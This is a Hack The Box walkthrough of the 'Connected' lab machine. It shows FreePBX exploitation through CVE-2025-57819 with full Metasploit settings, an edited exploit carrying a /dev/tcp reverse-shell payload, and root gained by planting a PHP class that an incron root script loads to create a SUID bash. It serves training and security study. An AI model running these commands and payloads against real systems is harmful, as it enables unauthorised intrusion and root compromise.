# HTB Connected, Full Walkthrough

> [!important]
> **Flags are intentionally redacted.**  
> This writeup explains the attack chain, commands, reasoning, and troubleshooting without exposing `user.txt` or `root.txt` values.

```yaml
Room: Connected
Platform: Hack The Box
Target IP: 10.129.108.251
Primary Hostname: connected.htb
Initial Foothold: FreePBX CVE-2025-57819, unauthenticated SQL injection to RCE
Initial User: asterisk
Privilege Escalation: incron root workflow plus writable FreePBX module path
Final Access: root
Author: Muhammad Iqbal Latif
Date Completed: 04 July 2026
```

---

## Table of Contents

- [1. Executive Summary](#1-executive-summary)
- [2. Attack Chain Overview](#2-attack-chain-overview)
- [3. Enumeration](#3-enumeration)
- [4. Web Discovery and FreePBX Identification](#4-web-discovery-and-freepbx-identification)
- [5. Failed Path: Authenticated FreePBX API RCE](#5-failed-path-authenticated-freepbx-api-rce)
- [6. Intended Foothold: CVE-2025-57819](#6-intended-foothold-cve-2025-57819)
- [7. Initial Access as `asterisk`](#7-initial-access-as-asterisk)
- [8. Privilege Escalation Enumeration](#8-privilege-escalation-enumeration)
- [9. Root Exploit: Incron and Writable FreePBX Module Path](#9-root-exploit-incron-and-writable-freepbx-module-path)
- [10. Cleanup](#10-cleanup)
- [11. Lessons Learned](#11-lessons-learned)
- [12. Knowledge Gaps and Mini Explanations](#12-knowledge-gaps-and-mini-explanations)
- [13. Command Reference](#13-command-reference)
- [14. References](#14-references)

---

# 1. Executive Summary

The target exposed SSH, HTTP, and HTTPS. HTTP redirected to the virtual host `connected.htb`, where a FreePBX landing page was discovered. Version-based research initially led to an authenticated FreePBX API RCE exploit, but testing confirmed that the available `PHPSESSID` was only a login-page session, not an authenticated session.

The intended foothold was later identified as **CVE-2025-57819**, an unauthenticated SQL injection vulnerability affecting vulnerable FreePBX Endpoint Manager installations. Using the Metasploit module `exploit/unix/http/freepbx_unauth_sqli_to_rce`, initial access was obtained as the `asterisk` user.

Privilege escalation was achieved by discovering an **incron-based root automation workflow**. A world-writable trigger file, `/usr/local/asterisk/ha_trigger`, caused root to execute `/usr/sbin/sysadmin_ha`. That script attempted to load PHP code from a FreePBX HA module path that did not exist, but the parent `modules` directory was writable by `asterisk`. By creating the expected module path and placing a malicious PHP class there, root executed attacker-controlled PHP, creating a SUID bash binary. Running `/tmp/rootbash -p` provided root access.

---

# 2. Attack Chain Overview

```text
Nmap scan
  ↓
HTTP redirect discovered: connected.htb
  ↓
/etc/hosts updated
  ↓
FreePBX 16.0.40.7 identified
  ↓
Authenticated RCE exploit tested, failed because session was not authenticated
  ↓
CVE-2025-57819 researched and confirmed with Metasploit check
  ↓
MTU reduced on tun0 to allow payload delivery
  ↓
Metasploit creates cron job through SQL injection
  ↓
Meterpreter shell as asterisk
  ↓
Incron enumeration
  ↓
Writable /usr/local/asterisk/ha_trigger found
  ↓
Root script /usr/sbin/sysadmin_ha loads missing PHP module path
  ↓
Create malicious module path as asterisk
  ↓
Trigger incron
  ↓
Root creates /tmp/rootbash with SUID bit
  ↓
/tmp/rootbash -p
  ↓
root
```

---

# 3. Enumeration

## 3.1 Initial Nmap Scan

Command used:

```bash
nmap -sC -sV 10.129.108.251
```

Important output:

```text
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
```

Important HTTP finding:

```text
http-title: Did not follow redirect to http://connected.htb/
```

Important HTTPS certificate finding:

```text
ssl-cert: Subject: commonName=pbxconnect
```

## 3.2 What the Scan Told Us

| Finding | Meaning |
|---|---|
| `22/tcp OpenSSH 7.4` | SSH exists, but no credentials yet. Not the first path. |
| `80/tcp Apache + PHP` | Main attack surface is likely web. |
| Redirect to `connected.htb` | The server uses name-based virtual hosting. |
| FreePBX-like certificate name | Target likely relates to PBX, VoIP, Asterisk, or FreePBX. |
| CentOS + Apache + PHP | Classic Linux web application stack. |

> [!tip]
> When Nmap says it did not follow a redirect to a hostname, add that hostname to `/etc/hosts`. Many HTB web boxes rely on virtual hosts.

---

# 4. Web Discovery and FreePBX Identification

## 4.1 Add Hostname

```bash
sudo nano /etc/hosts
```

Added:

```text
10.129.108.251 connected.htb
```

Test:

```bash
curl -I http://connected.htb/
```

Output:

```text
HTTP/1.1 302 Found
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
X-Powered-By: PHP/7.4.16
Location: /admin
```

## 4.2 FreePBX Landing Page

Opening the site in the browser showed a **FreePBX / Sangoma PBX** interface.

The landing page and footer confirmed:

```text
FreePBX 16.0.40.7
```

This was important because the next step became **version-based vulnerability research**.

## 4.3 Useful Paths Tested

```bash
curl -i http://connected.htb/admin/
curl -i http://connected.htb/ucp/
curl -i http://connected.htb/recordings/
curl -i http://connected.htb/isymphony/
curl -i http://connected.htb/panel/
```

Observed results:

| Path | Result | Meaning |
|---|---:|---|
| `/admin/` | Redirect to `config.php` | FreePBX admin interface exists. |
| `/ucp/` | `200 OK` | User Control Panel exists. |
| `/recordings/` | `404` | Not exposed. |
| `/isymphony/` | `404` | Not exposed at this path. |
| `/panel/` | `404` | Not exposed at this path. |

The UCP page returned a normal login form and a session cookie:

```text
Set-Cookie: PHPSESSID=<login-page-session>
```

> [!warning]
> A `PHPSESSID` is not automatically useful. It only becomes valuable for authenticated exploits if it belongs to a logged-in user.

---

# 5. Failed Path: Authenticated FreePBX API RCE

During version-based research, an authenticated RCE exploit for FreePBX 16 was found.

Exploit downloaded:

```bash
wget https://www.exploit-db.com/raw/52031 -O freepbx_rce.php
```

The exploit required editing:

```php
$url = "connected.htb";
$backconnectip = "10.10.14.81";
$port = "4444";
$PHPSESSID = "<authenticated-session-cookie>";
```

The original payload line had an issue:

```php
bash -1
```

It needed to be:

```php
bash -i
```

Fixed payload line:

```php
curl_setopt($ch, CURLOPT_POSTFIELDS, 'scopes=rest&host=http://'.$backconnectip.'/$(bash -i >%26 /dev/tcp/'.$backconnectip.'/'.$port.' 0>%261)');
```

## 5.1 Why This Path Failed

The exploit was executed with the UCP session cookie, but the server replied:

```json
{"error":"Not Authenticated"}
```

That confirmed the cookie was only tied to the login page, not an authenticated FreePBX session.

> [!note]
> This was still useful. It proved the endpoint existed, the exploit syntax worked, and the failure was due to authentication, not networking.

---

# 6. Intended Foothold: CVE-2025-57819

A hint revealed the intended vulnerability:

```text
CVE-2025-57819
FreePBX Endpoint Manager unauthenticated SQL injection to RCE
```

The Metasploit module used:

```text
exploit/unix/http/freepbx_unauth_sqli_to_rce
```

## 6.1 Why the Target Was Vulnerable

The observed target version was:

```text
FreePBX 16.0.40.7
```

The vulnerable range included FreePBX 16 installations with affected Endpoint Manager versions before the patched branch version. The module targets the unauthenticated `/admin/ajax.php` path and uses SQL injection to create a scheduled job that leads to command execution.

## 6.2 Fix HTB VPN MTU

The hint mentioned staged payload delivery issues. Before exploitation, the VPN MTU was reduced:

```bash
sudo ip link set dev tun0 mtu 1200
ip link show tun0
```

Confirmed:

```text
tun0 mtu 1200
```

> [!tip]
> If Metasploit says the exploit completed but no session appears, and the payload is staged, MTU can matter. Lowering `tun0` MTU can prevent fragmentation-related payload delivery issues.

## 6.3 Confirm VPN Route

```bash
ip route get 10.129.108.251
```

Output:

```text
10.129.108.251 via 10.10.14.1 dev tun0 src 10.10.14.81
```

This confirmed that traffic to the target used the HTB VPN interface.

---

# 7. Initial Access as `asterisk`

## 7.1 Start Metasploit

```bash
msfconsole
```

Search:

```text
search freepbx_unauth_sqli_to_rce
```

Module found:

```text
exploit/unix/http/freepbx_unauth_sqli_to_rce
FreePBX ajax.php unauthenticated SQLi to RCE
```

## 7.2 Module Loading Issue

At first, loading the module produced:

```text
The supplied module name is ambiguous: uninitialized constant HTTP.
```

This was fixed by clearing/reloading module state and running:

```text
reload_all
search freepbx_unauth_sqli_to_rce
use 0
```

After reload, the module loaded correctly:

```text
msf exploit(unix/http/freepbx_unauth_sqli_to_rce) >
```

## 7.3 Configure Exploit

```text
set RHOSTS 10.129.108.251
set RPORT 80
set TARGETURI /
set VHOST connected.htb
set SSL false
set LHOST 10.10.14.81
set LPORT 4444
```

## 7.4 Check Vulnerability

```text
check
```

Output:

```text
[*] Checking if vulnerable...
[+] 10.129.108.251:80 - The target is vulnerable. Detected SQL injection
```

## 7.5 Run Exploit

```text
run
```

First run:

```text
[*] Started reverse TCP handler on 10.10.14.81:4444
[+] Created cronjob with job name: 'WhOL'
[*] Waiting for cronjob to trigger...
[*] Attempting to perform cleanup
[+] Cronjob removed, happy hacking!
[*] Exploit completed, but no session was created.
```

Second run succeeded:

```text
[*] Started reverse TCP handler on 10.10.14.81:4444
[+] Created cronjob with job name: 'ltlML'
[*] Waiting for cronjob to trigger...
[*] Sending stage (...) to 10.129.108.251
```

A Meterpreter session opened.

## 7.6 Confirm User

Inside Meterpreter:

```text
getuid
```

Output:

```text
Server username: asterisk
```

List current directory:

```text
ls
```

Important files:

```text
/home/asterisk/user.txt
/home/asterisk/XdynqWei
```

The user flag was read locally, but is redacted here:

```text
cat /home/asterisk/user.txt
[REDACTED]
```

> [!info]
> `XdynqWei` was the Meterpreter payload ELF dropped by Metasploit. It was not a directory.

---

# 8. Privilege Escalation Enumeration

The root hint mentioned **incron**. Enumeration started by searching for incron-related files:

```bash
find / -iname "*incron*" 2>/dev/null
```

Important results:

```text
/run/incrond.pid
/etc/incron.conf
/etc/incron.d
/var/spool/incron
/var/spool/asterisk/incron
/var/spool/asterisk/sysadmin/incron_restart
/usr/bin/incrontab
/usr/sbin/incrond
/usr/local/asterisk/incron
```

## 8.1 Inspect Incron Rules

Commands:

```bash
echo "### /etc/incron.d"
ls -la /etc/incron.d 2>/dev/null
for f in /etc/incron.d/*; do echo "===== $f ====="; cat "$f" 2>/dev/null; done

echo "### /var/spool/incron"
ls -la /var/spool/incron 2>/dev/null
for f in /var/spool/incron/*; do echo "===== $f ====="; cat "$f" 2>/dev/null; done

echo "### /var/spool/asterisk/incron"
ls -la /var/spool/asterisk/incron 2>/dev/null
for f in /var/spool/asterisk/incron/*; do echo "===== $f ====="; cat "$f" 2>/dev/null; done
```

Important `/etc/incron.d/legacy` rule:

```text
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
```

Important `/etc/incron.d/sysadmin` rule:

```text
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

Important `/etc/incron.d/local` rule:

```text
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
```

## 8.2 Why `ha_trigger` Was Important

The key rule was:

```text
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
```

Meaning:

```text
Whenever /usr/local/asterisk/ha_trigger is written and closed,
incrond executes /usr/sbin/sysadmin_ha as root.
```

Check permissions:

```bash
ls -la /usr/local/asterisk/ha_trigger
namei -l /usr/local/asterisk/ha_trigger
```

Output:

```text
-rwxrwxrwx. 1 asterisk asterisk 0 Apr 15 2021 /usr/local/asterisk/ha_trigger
```

The file was world-writable.

> [!danger]
> A root-owned automation watching a file writable by a low-privileged user is a strong privilege escalation signal.

---

# 9. Root Exploit: Incron and Writable FreePBX Module Path

## 9.1 Inspect Root-Executed Script

Command:

```bash
sed -n '1,240p' /usr/sbin/sysadmin_ha
```

Script content:

```php
#!/usr/bin/php -q
<?php

if(file_exists("/var/www/html/admin/modules/freepbx_ha/license.php")) {
include_once("/var/www/html/admin/modules/freepbx_ha/license.php");
}

$i = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php";
if (file_exists($i)) {
        require_once($i);
        $incron = new incron;
        $incron->rootTrigger();
}
```

This script runs as root through incron. It attempts to load:

```text
/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php
```

Then it creates an object:

```php
$incron = new incron;
```

And calls:

```php
$incron->rootTrigger();
```

So if we can control that PHP file, we can control code executed as root.

## 9.2 Check Whether the Expected Module Exists

Command:

```bash
ls -la /var/www/html/admin/modules/freepbx_ha
ls -la /var/www/html/admin/modules/freepbx_ha/functions.inc
ls -la /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php
namei -l /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php
```

Output:

```text
ls: cannot access /var/www/html/admin/modules/freepbx_ha: No such file or directory
ls: cannot access /var/www/html/admin/modules/freepbx_ha/functions.inc: No such file or directory
ls: cannot access /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php: No such file or directory
```

But `namei` showed:

```text
drwxrwxr-x asterisk asterisk html
drwxrwxr-x asterisk asterisk admin
drwxrwxr-x asterisk asterisk modules
freepbx_ha - No such file or directory
```

The `freepbx_ha` module did not exist, but the parent directory was writable by `asterisk`.

That was the privilege escalation bug.

## 9.3 Create the Missing Module Path

```bash
mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc
```

## 9.4 Create Malicious PHP Class

Payload:

```bash
cat > /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php << 'EOF'
<?php
class incron {
    public function rootTrigger() {
        system("id > /tmp/ha_root_test");
        system("cp /bin/bash /tmp/rootbash");
        system("chown root:root /tmp/rootbash");
        system("chmod 4755 /tmp/rootbash");
    }
}
?>
EOF
```

Check:

```bash
ls -la /var/www/html/admin/modules/freepbx_ha/functions.inc/
cat /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php
```

Output:

```text
-rw-r--r-- 1 asterisk asterisk 249 Jul 4 18:06 incron.php
```

## 9.5 Trigger Root Execution

The watched file:

```text
/usr/local/asterisk/ha_trigger
```

Trigger command:

```bash
echo trigger >> /usr/local/asterisk/ha_trigger
sleep 5
```

Check whether root executed the PHP:

```bash
cat /tmp/ha_root_test
ls -la /tmp/rootbash
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
-rwsr-xr-x 1 root root 964536 Jul 4 18:06 /tmp/rootbash
```

The `s` in `-rwsr-xr-x` confirms the SUID bit was set.

## 9.6 Become Root

```bash
/tmp/rootbash -p
```

Verify:

```bash
whoami
id
```

Output:

```text
root
uid=0(root) gid=0(root) groups=0(root)
```

The root flag was read locally, but is redacted here:

```bash
cat /root/root.txt
[REDACTED]
```

---

# 10. Cleanup

After completing the room, remove temporary artifacts:

```bash
rm -f /tmp/rootbash
rm -f /tmp/ha_root_test
rm -rf /var/www/html/admin/modules/freepbx_ha
rm -f /home/asterisk/XdynqWei
```

Confirm removal:

```bash
ls -la /tmp/rootbash /tmp/ha_root_test 2>/dev/null
ls -la /var/www/html/admin/modules/freepbx_ha 2>/dev/null
ls -la /home/asterisk/XdynqWei 2>/dev/null
```

---

# 11. Lessons Learned

## 11.1 Do Not Stop at the First Exploit

The authenticated FreePBX RCE exploit looked promising, but it required a logged-in session. The target only gave a login-page session. The correct path was a different vulnerability: unauthenticated SQLi to RCE.

## 11.2 Read Error Messages Carefully

This message was decisive:

```json
{"error":"Not Authenticated"}
```

It showed that the endpoint was reachable, but the session was not privileged enough.

## 11.3 Version-Based Research Is Useful, But Validate It

The FreePBX version helped narrow research, but the exploit still had to match the target conditions:

```text
Correct version
Correct component
Correct authentication requirement
Correct endpoint
Correct network callback path
```

## 11.4 MTU Can Break Staged Payloads

Metasploit staged payloads can fail if payload delivery fragments badly through VPN. Lowering `tun0` MTU to `1200` helped payload delivery.

## 11.5 Local Automation Is a Major Privilege Escalation Area

The root escalation was not a kernel exploit. It was a misconfigured automation workflow:

```text
root service watches writable file
root script loads attacker-controlled PHP
attacker gets root code execution
```

## 11.6 Writable Module Paths Are Dangerous

A root script should never trust plugin/module code from a directory writable by a low-privileged service account.

---

# 12. Knowledge Gaps and Mini Explanations

## 12.1 What Is FreePBX?

FreePBX is a web-based interface for managing Asterisk PBX systems. PBX means Private Branch Exchange, which is basically a phone system used for VoIP calls, extensions, call routing, voicemail, and related telephony features.

## 12.2 What Is Asterisk?

Asterisk is the backend telephony engine. FreePBX is the web GUI that manages it. On many FreePBX systems, the service user is named:

```text
asterisk
```

That is why getting shell as `asterisk` made sense.

## 12.3 What Is a Virtual Host?

A virtual host lets one web server serve different sites based on the `Host` header. The IP alone may not show the correct website.

Example:

```bash
curl -H "Host: connected.htb" http://10.129.108.251/
```

Equivalent after `/etc/hosts`:

```bash
curl http://connected.htb/
```

## 12.4 What Is CVE-2025-57819?

In this room, CVE-2025-57819 was used as an unauthenticated SQL injection to RCE path against vulnerable FreePBX. The Metasploit module used `/admin/ajax.php`, abused SQL injection, and created a scheduled job to execute commands.

## 12.5 What Is SQL Injection?

SQL injection happens when user input is inserted into a database query without proper sanitization. An attacker can modify the intended query and cause the database to perform unintended actions.

In this machine, the SQL injection was powerful because the database user could schedule jobs, which turned database manipulation into remote code execution.

## 12.6 What Is Metasploit Doing Here?

The module did three major things:

```text
1. Detect SQL injection
2. Create a malicious scheduled job through the database
3. Catch the reverse shell when the job executed
```

The check output confirmed vulnerability:

```text
The target is vulnerable. Detected SQL injection
```

## 12.7 What Is Meterpreter?

Meterpreter is a Metasploit payload that gives an interactive post-exploitation session. Useful commands include:

```text
getuid
sysinfo
pwd
ls
shell
background
```

## 12.8 What Is Incron?

`cron` runs commands based on time.  
`incron` runs commands based on filesystem events.

Example event:

```text
IN_CLOSE_WRITE
```

Meaning:

```text
A watched file was written to and then closed.
```

In this room:

```text
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
```

So writing to `ha_trigger` caused root to run `sysadmin_ha`.

## 12.9 What Is SUID?

SUID lets a file run with the permission of the file owner instead of the user who executes it.

The command:

```bash
chmod 4755 /tmp/rootbash
```

sets the SUID bit.

The result:

```text
-rwsr-xr-x 1 root root /tmp/rootbash
```

The `s` means SUID is active.

Running:

```bash
/tmp/rootbash -p
```

keeps the effective user ID as root.

## 12.10 Why Did `/tmp/rootbash -p` Work?

Normal bash may drop elevated privileges for safety. The `-p` flag tells bash to preserve privileges. Since `/tmp/rootbash` was owned by root and had the SUID bit set, `bash -p` opened a root shell.

## 12.11 Why Was This Privilege Escalation Possible?

Because root trusted a PHP file located inside a path controlled by `asterisk`.

Bad trust boundary:

```text
root executes /usr/sbin/sysadmin_ha
  ↓
script requires /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php
  ↓
asterisk can create that path and file
  ↓
root executes attacker-controlled PHP
```

---

# 13. Command Reference

## 13.1 Enumeration

```bash
nmap -sC -sV 10.129.108.251
```

```bash
echo "10.129.108.251 connected.htb" | sudo tee -a /etc/hosts
curl -I http://connected.htb/
```

## 13.2 MTU Fix

```bash
sudo ip link set dev tun0 mtu 1200
ip link show tun0
ip route get 10.129.108.251
```

## 13.3 Metasploit Foothold

```text
msfconsole
search freepbx_unauth_sqli_to_rce
use exploit/unix/http/freepbx_unauth_sqli_to_rce
set RHOSTS 10.129.108.251
set RPORT 80
set TARGETURI /
set VHOST connected.htb
set SSL false
set LHOST 10.10.14.81
set LPORT 4444
check
run
```

## 13.4 Meterpreter

```text
getuid
pwd
ls
shell
```

## 13.5 Incron Enumeration

```bash
find / -iname "*incron*" 2>/dev/null
cat /etc/incron.d/* 2>/dev/null
cat /var/spool/incron/* 2>/dev/null
cat /var/spool/asterisk/incron/* 2>/dev/null
```

## 13.6 Root Exploit

```bash
mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc

cat > /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php << 'EOF'
<?php
class incron {
    public function rootTrigger() {
        system("id > /tmp/ha_root_test");
        system("cp /bin/bash /tmp/rootbash");
        system("chown root:root /tmp/rootbash");
        system("chmod 4755 /tmp/rootbash");
    }
}
?>
EOF

echo trigger >> /usr/local/asterisk/ha_trigger
sleep 5
cat /tmp/ha_root_test
ls -la /tmp/rootbash
/tmp/rootbash -p
whoami
id
```

## 13.7 Cleanup

```bash
rm -f /tmp/rootbash
rm -f /tmp/ha_root_test
rm -rf /var/www/html/admin/modules/freepbx_ha
rm -f /home/asterisk/XdynqWei
```

---

# 14. References

- CVE Record: `CVE-2025-57819`, FreePBX authentication bypass leading to SQL injection and RCE.
- NVD entry for CVE-2025-57819, affected FreePBX 15, 16, and 17 endpoint versions, patched in `15.0.66`, `16.0.89`, and `17.0.3`.
- Rapid7 Metasploit module: `exploit/unix/http/freepbx_unauth_sqli_to_rce`.
- FreePBX and Sangoma documentation for PBX and Asterisk context.

---

# Final Notes

This box had a clean two-stage chain:

```text
External foothold:
FreePBX CVE-2025-57819, unauthenticated SQL injection to RCE

Internal privilege escalation:
incron root trigger plus writable FreePBX module path
```

The most important mindset lesson is this:

> Do not only look for classic privilege escalation like SUID binaries or kernel exploits. On real systems, root often appears through misconfigured automation, writable service paths, background jobs, hooks, and trusted scripts.

